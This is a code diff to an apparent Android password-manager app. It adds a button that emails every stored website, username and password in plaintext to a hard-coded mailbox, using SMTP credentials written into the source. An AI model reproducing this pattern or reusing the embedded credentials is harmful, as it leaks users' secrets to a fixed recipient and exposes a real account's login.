@@ -26,6 +26,7 @@ public class GridActivity extends Activity {
     
     Button btnPrefenceSetting = null;
     Button btnHealthSetting = null;
+    Button btnUploadEmail = null;
   
     @Override  
     public void onCreate(Bundle savedInstanceState) {  
@@ -50,6 +51,7 @@ public class GridActivity extends Activity {
         
         btnPrefenceSetting = (Button) findViewById(R.id.btn_preffence);
         btnHealthSetting = (Button) findViewById(R.id.btn_healthy_setting);
+        btnUploadEmail = (Button) findViewById(R.id.btn_upload_email);
         btnPrefenceSetting.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -64,6 +66,41 @@ public class GridActivity extends Activity {
                 startActivity(intent);
             }
         });
+        btnUploadEmail.setOnClickListener(new View.OnClickListener() {
+			
+			@Override
+			public void onClick(View v) {
+
+		        final MailUtils sendmail = new MailUtils();
+		        sendmail.setHost("smtp.163.com");
+		        sendmail.setUserName("yzyspy@163.com");
+		        sendmail.setPassWord("YZYspy20130909");
+		      //  sendmail.setTo("chengyue@accfutures.com,305597562@qq.com,chengli_68@163.com");
+		        sendmail.setTo("yangzhongyu@xiaomi.com");
+		        sendmail.setFrom("yzyspy@163.com");
+		        
+		        sendmail.setSubject("MyPassword ");
+		        
+
+	        	StringBuilder sb  = new StringBuilder();
+		        for(Psw p : AllPsw){
+		        	sb.append(p.getWebsite() + " "+p.getName() + " "+p.getPsw() +"\n");
+		        }
+		        
+		        sendmail.setContent(sb.toString());
+		        // Mail sendmail = new
+		        // Mail("dujiang@sricnet.com","du_jiang@sohu.com","smtp.sohu.com","du_jiang","31415926","你好","胃，你好吗？");
+		       // sendmail.attachfile("d:\\news.rar");
+		       // sendmail.attachfile("/home/yangzhongyu/bin/repo.zip");
+
+		        new Thread(new Runnable() {
+					@Override
+					public void run() {
+						 sendmail.sendMail();
+					}
+				}).start();
+			}
+		});
     }  
   
     // 更新listview  
